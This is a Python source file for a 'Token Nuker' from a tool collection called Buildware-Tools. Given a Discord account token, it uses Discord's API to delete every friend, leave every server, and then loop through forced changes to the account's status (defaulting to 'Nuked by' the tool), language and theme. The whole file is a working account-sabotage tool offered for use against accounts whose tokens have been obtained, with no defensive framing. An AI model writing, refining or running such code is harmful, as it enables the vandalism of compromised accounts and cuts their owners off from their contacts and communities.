# Copyright (c) 2025-2026 v4lkyr0 — Buildware-Tools
# See the file 'LICENSE' for copying permission.
# --------------------------------------------------------
# EN: Non-commercial use only. Do not sell, remove credits
#     or redistribute without prior written permission.
# FR: Usage non-commercial uniquement. Ne pas vendre, supprimer
#     les crédits ou redistribuer sans autorisation écrite.

from Core.Utils import *
from Core.Config import *

try:
    from itertools import cycle
    import random
    import requests
    import time
except Exception as e:
    MissingModule(e)

Title("Token Nuker")

Scroll(GradientBanner(discord_banner))

try:
    token      = ChoiceToken()
    new_status = input(f"{INPUT} Custom Status {red}->{reset} ").strip()

    try:
        loop_count = int(input(f"{INPUT} Loops {red}->{reset} ").strip())
        if loop_count <= 0:
            ErrorNumber()
    except:
        ErrorNumber()

    headers       = {
        "Authorization": token,
        "Content-Type" : "application/json",
        "User-Agent"   : RandomUserAgents(),
    }
    default_status = f"Nuked by {name_tool} | {github_url}"
    custom_status  = f"{new_status} | {name_tool}" if new_status else default_status
    themes_cycle   = cycle(["dark", "light"])

    def ApiGet(url):
        while True:
            try:
                r = requests.get(url, headers=headers, timeout=10)
                if r.status_code == 429:
                    time.sleep(r.json().get("retry_after", 1))
                    continue
                return r
            except Exception:
                return None

    def ApiDelete(url):
        while True:
            try:
                r = requests.delete(url, headers=headers, timeout=10)
                if r.status_code == 429:
                    time.sleep(r.json().get("retry_after", 1))
                    continue
                return r
            except Exception:
                return None

    def ApiPatch(url, json=None):
        while True:
            try:
                r = requests.patch(url, headers=headers, json=json or {}, timeout=10)
                if r.status_code == 429:
                    time.sleep(r.json().get("retry_after", 1))
                    continue
                return r
            except Exception:
                return None

    def RemoveFriends():
        r = ApiGet("https://discord.com/api/v9/users/@me/relationships")
        if not r or r.status_code != 200:
            print(f"{ERROR} Could not fetch friends!", reset)
            return
        for friend in r.json():
            if friend.get("type") != 1:
                continue
            friend_id = friend.get("id")
            username  = friend.get("user", {}).get("username", "None")
            if not friend_id:
                continue
            resp = ApiDelete(f"https://discord.com/api/v9/users/@me/relationships/{friend_id}")
            if resp and resp.status_code == 204:
                print(f"{SUCCESS} Removed friend:{red} {username}", reset)
            else:
                print(f"{ERROR} Failed friend:{red} {username}", reset)

    def LeaveServers():
        r = ApiGet("https://discord.com/api/v9/users/@me/guilds")
        if not r or r.status_code != 200:
            print(f"{ERROR} Could not fetch servers!", reset)
            return
        for guild in r.json():
            guild_id   = guild.get("id")
            guild_name = guild.get("name", "None")
            if not guild_id:
                continue
            resp = ApiDelete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}")
            if resp and resp.status_code in [200, 204]:
                print(f"{SUCCESS} Left server:{red} {guild_name}", reset)
            else:
                print(f"{ERROR} Failed server:{red} {guild_name}", reset)

    print(f"{LOADING} Removing friends..", reset)
    RemoveFriends()

    print(f"{LOADING} Leaving servers..", reset)
    LeaveServers()

    print(f"{LOADING} Nuking..", reset)

    for _ in range(loop_count):
        for status_text in [default_status, custom_status]:
            resp = ApiPatch(
                "https://discord.com/api/v9/users/@me/settings",
                json={"custom_status": {"text": status_text}}
            )
            if resp and resp.status_code == 200:
                print(f"{SUCCESS} Status changed:{red} {status_text}", reset)
            else:
                print(f"{ERROR} Failed status:{red} {status_text}", reset)

        for _ in range(5):
            random_language = random.choice(["zh", "ar", "ja", "ko", "ru"])
            resp = ApiPatch(
                "https://discord.com/api/v9/users/@me/settings",
                json={"locale": random_language}
            )
            if resp and resp.status_code == 200:
                print(f"{SUCCESS} Language changed:{red} {random_language}", reset)
            else:
                print(f"{ERROR} Failed language:{red} {random_language}", reset)

            theme = next(themes_cycle)
            resp  = ApiPatch(
                "https://discord.com/api/v9/users/@me/settings",
                json={"theme": theme}
            )
            if resp and resp.status_code == 200:
                print(f"{SUCCESS} Theme changed:{red} {theme}", reset)
            else:
                print(f"{ERROR} Failed theme:{red} {theme}", reset)

            time.sleep(0.33)

    print(f"\n{SUCCESS} Completed!", reset)

    Continue()
    Reset()

except Exception as e:
    Error(e)